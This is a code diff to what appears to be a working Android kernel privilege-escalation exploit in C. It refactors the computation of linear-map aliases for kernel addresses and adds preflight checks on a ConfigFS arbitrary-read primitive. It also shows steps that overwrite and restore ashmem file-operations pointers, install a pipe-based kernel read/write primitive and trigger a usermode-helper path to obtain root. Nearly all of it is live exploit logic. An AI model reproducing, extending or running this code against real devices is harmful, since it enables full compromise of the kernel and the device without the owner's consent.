@@ -143,42 +143,71 @@ static pid_t spawn_allocation_keeper(void) {
 struct do_one_attempt_ctx {
   uint64_t kernel_base;
   uint64_t payload_base;
+  uint64_t memstart_addr;
+  uint64_t kimage_voffset;
   const char *root_umh_path;
   struct attempt_shared_state *shared;
 };
+
+static int kernel_image_linear_alias(uint64_t memstart_addr,
+                                     uint64_t kimage_voffset,
+                                     uint64_t kernel_address,
+                                     uint64_t *linear_alias) {
+  if (!linear_alias || (memstart_addr & 0xfffULL) != 0 ||
+      (kimage_voffset & 0xfffULL) != 0 ||
+      kernel_address < kimage_voffset) {
+    return 0;
+  }
+  uint64_t physical = kernel_address - kimage_voffset;
+  if (physical < memstart_addr) {
+    return 0;
+  }
+  uint64_t linear_offset = physical - memstart_addr;
+  if (linear_offset >= ZZHL_LINEAR_MAP_END - ZZHL_LINEAR_MAP_BASE) {
+    return 0;
+  }
+  *linear_alias = ZZHL_LINEAR_MAP_BASE + linear_offset;
+  return 1;
+}
+
+static int read_linear_map_inputs(struct do_one_attempt_ctx *ctx, int fd) {
+  if (!oss_kernel_read(fd, ctx->kernel_base + ZZHL_MEMSTART_ADDR_OFF,
+                       &ctx->memstart_addr, sizeof(ctx->memstart_addr)) ||
+      !oss_kernel_read(fd, ctx->kernel_base + ZZHL_KIMAGE_VOFFSET_OFF,
+                       &ctx->kimage_voffset, sizeof(ctx->kimage_voffset))) {
+    oss_diag_checkpoint("linear-alias-input-read-failed");
+    return 0;
+  }
+  uint64_t probe = 0;
+  if (!kernel_image_linear_alias(ctx->memstart_addr, ctx->kimage_voffset,
+                                 ctx->kernel_base, &probe)) {
+    fprintf(stderr,
+            "[immediate] invalid linear alias inputs memstart=%016llx "
+            "voffset=%016llx\n",
+            (unsigned long long)ctx->memstart_addr,
+            (unsigned long long)ctx->kimage_voffset);
+    oss_diag_checkpoint("linear-alias-input-invalid");
+    return 0;
+  }
+  return 1;
+}
 
 static int restore_ashmem_fops_via_pipe(struct do_one_attempt_ctx *ctx,
                                         int fd,
                                         uint64_t ashmem_misc_fops_addr,
                                         uint64_t real_ashmem_fops) {
-  uint64_t memstart_addr = 0;
-  uint64_t kimage_voffset = 0;
-  if (!oss_kernel_read(fd, ctx->kernel_base + ZZHL_MEMSTART_ADDR_OFF,
-                       &memstart_addr, sizeof(memstart_addr)) ||
-      !oss_kernel_read(fd, ctx->kernel_base + ZZHL_KIMAGE_VOFFSET_OFF,
-                       &kimage_voffset, sizeof(kimage_voffset))) {
-    oss_diag_checkpoint("fops-restore-alias-read-failed");
-    return 0;
-  }
-
-  uint64_t physical = ashmem_misc_fops_addr - kimage_voffset;
-  if ((memstart_addr & 0xfffULL) != 0 ||
-      (kimage_voffset & 0xfffULL) != 0 || physical < memstart_addr) {
+  uint64_t linear_alias = 0;
+  if (!kernel_image_linear_alias(ctx->memstart_addr, ctx->kimage_voffset,
+                                 ashmem_misc_fops_addr, &linear_alias)) {
     fprintf(stderr,
             "[immediate] invalid image alias inputs memstart=%016llx "
-            "voffset=%016llx physical=%016llx\n",
-            (unsigned long long)memstart_addr,
-            (unsigned long long)kimage_voffset,
-            (unsigned long long)physical);
+            "voffset=%016llx target=%016llx\n",
+            (unsigned long long)ctx->memstart_addr,
+            (unsigned long long)ctx->kimage_voffset,
+            (unsigned long long)ashmem_misc_fops_addr);
     oss_diag_checkpoint("fops-restore-alias-invalid");
     return 0;
   }
-  uint64_t linear_offset = physical - memstart_addr;
-  if (linear_offset >= ZZHL_LINEAR_MAP_END - ZZHL_LINEAR_MAP_BASE) {
-    oss_diag_checkpoint("fops-restore-alias-range-failed");
-    return 0;
-  }
-  uint64_t linear_alias = ZZHL_LINEAR_MAP_BASE + linear_offset;
   oss_diag_checkpoint("fops-restore-pipe-start");
   int written = oss_pipe_rw_write(fd, linear_alias, &real_ashmem_fops,
                                   sizeof(real_ashmem_fops));
@@ -243,6 +272,15 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
     return 0;
   }
 
+  /* ConfigFS AAR is used only before pipe installation. Everything after
+   * oss_pipe_rw_install() reads through the pipe and the linear alias. */
+  if (!read_linear_map_inputs(ctx, fd)) {
+    fprintf(stderr, "[immediate] linear alias input read failed\n");
+    recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
+                        ctx->kernel_base + ZZHL_ASHMEM_FOPS_OFF);
+    return 0;
+  }
+
   oss_diag_checkpoint("pipe-install-start");
   puts("\x1b[33m[*] \x1b[0mstage=starting-temporary-root");
   if (!oss_pipe_rw_install(fd, ctx->kernel_base, ctx->payload_base)) {
@@ -266,11 +304,12 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
    * native schedule_work() path and restores the PTY after completion. */
   oss_diag_checkpoint("root-umh-start");
   int rooted = root_umh_install_fd_tracked(
-      fd, ctx->kernel_base, ctx->payload_base, ctx->root_umh_path,
-      &ctx->shared->status, ATTEMPT_NATIVE_WORK_SUBMITTED);
+      fd, ctx->kernel_base, ctx->payload_base, ctx->memstart_addr,
+      ctx->kimage_voffset, ctx->root_umh_path, &ctx->shared->status,
+      ATTEMPT_NATIVE_WORK_SUBMITTED);
   oss_diag_checkpoint(rooted ? "root-umh-ready" : "root-umh-failed");
   uint64_t null_owner = 0;
-  int owner_cleared = oss_kernel_write(
+  int owner_cleared = oss_pipe_rw_write(
       fd, ctx->payload_base | OSS_PRIMARY_FOPS_LIVE_OFFSET, &null_owner,
       sizeof(null_owner));
   fprintf(stderr, "[immediate] fake fops owner clear=%d\n", owner_cleared);
@@ -399,13 +438,32 @@ static int do_one_attempt(struct attempt_shared_state *shared,
           (unsigned long long)ashmem_misc_fops_addr,
           (unsigned long long)init_task_addr);
 
+  if (!oss_verify_kernel_access_plan_supported(ashmem_misc_fops_addr,
+                                                payload_base) ||
+      !oss_kernel_read_plan_supported(
+          kernel_base + ZZHL_MEMSTART_ADDR_OFF, sizeof(uint64_t)) ||
+      !oss_kernel_read_plan_supported(
+          kernel_base + ZZHL_KIMAGE_VOFFSET_OFF, sizeof(uint64_t))) {
+    fprintf(stderr,
+            "[preflight] ConfigFS plan rejected before futex "
+            "payload=%016llx errno=%d(%s); retry is safe\n",
+            (unsigned long long)payload_base, errno, strerror(errno));
+    oss_diag_checkpoint("configfs-plan-pretrigger-rejected");
+    return 0;
+  }
+  oss_diag_checkpoint("configfs-plan-pretrigger-ok");
+
   /* root_umh_path was validated before KASLR and allocator grooming. */
 
   /* BISECT_VARIANT is a project-only diagnostic switch. The default v14
    * now carries the -1 -> gate -> SIGUSR1 -> 1 -> sched_setattr
    * handshake and keeps the post-sigreturn window free of libc/syscalls. */
   struct do_one_attempt_ctx ctx = {
-      kernel_base, payload_base, root_umh_path, shared};
+      .kernel_base = kernel_base,
+      .payload_base = payload_base,
+      .root_umh_path = root_umh_path,
+      .shared = shared,
+  };
   const char *bisect = getenv("BISECT_VARIANT");
   int triggered;
   if (bisect && strcmp(bisect, "13") == 0) {
